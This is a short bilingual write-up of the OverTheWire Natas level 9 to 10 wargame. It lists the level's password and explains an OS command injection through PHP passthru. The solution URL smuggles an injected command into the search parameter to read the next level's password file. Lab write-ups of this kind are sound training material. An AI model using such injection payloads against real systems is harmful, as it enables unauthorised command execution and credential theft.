# Natas Nivel 9 → 10

| Campo | Valor |
|-------|-------|
| **Juego / Game** | Natas |
| **Nivel / Level** | 9 → 10 |
| **URL** | https://overthewire.org/wargames/natas/ |
| **Conexión** | `http://natas9.natas.labs.overthewire.org` |

# Username
natas9
# Password
ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
# Web vulnerability
OS Command Injection. Sourcecode analysis.
# Method of solve
Look at the sourcecode. See that it's using the PHP passthru function. Use simple injection payloads
```
http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10+%23&submit=Search
```

---

## Fuentes / Sources

- OTW: https://overthewire.org/wargames/natas/ - fecha de acceso: 2026-09-25.
- Autor notas: Apuromafo.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a OverTheWire.
> **EN:** Educational and personal use only. Not affiliated with OverTheWire.

_Fecha de edición: 2026-09-25_
